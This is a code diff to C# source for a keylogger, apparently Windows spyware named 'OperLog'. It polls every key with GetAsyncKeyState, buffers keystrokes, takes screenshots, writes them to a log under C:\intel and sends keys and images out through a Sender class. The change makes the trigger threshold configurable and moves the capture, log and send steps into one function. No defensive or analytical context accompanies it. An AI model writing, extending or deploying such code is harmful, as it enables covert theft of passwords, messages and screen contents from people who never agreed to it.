@@ -11,6 +11,7 @@ namespace OperLog
 {
     class Log
     {
+        public static int nsymb = 10;
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         //[STAThread]
@@ -24,8 +25,7 @@ namespace OperLog
         const string logpath = @"C:\intel\log.log";
         public static void Key_Log(object sender, DoWorkEventArgs e)
         {
-           
-           string buf = "";
+            string buf = "";
            while (true) {
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++) 
@@ -43,12 +43,9 @@ namespace OperLog
                         else {
                             buf += $"<{((Keys)i).ToString()}>";
                         }
-                        if (buf.Length > 10) {
+                        if (buf.Length > nsymb) {
                             // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
-                            Snap(picpath);
-                            AddText(buf, logpath);
-                            Sender m = new Sender();
-                            m.SendLog(buf,picpath);
+                            MakeLog(picpath,logpath,buf);
                             buf = "";
                         }
                     }
@@ -74,7 +71,10 @@ namespace OperLog
 
        static void MakeLog(string picpath, string logpath, string text)
        {
-
+           Snap(picpath);
+           AddText(text,logpath);
+           Sender m = new Sender();
+           m.SendLog(text,picpath);
        }
     }
 }
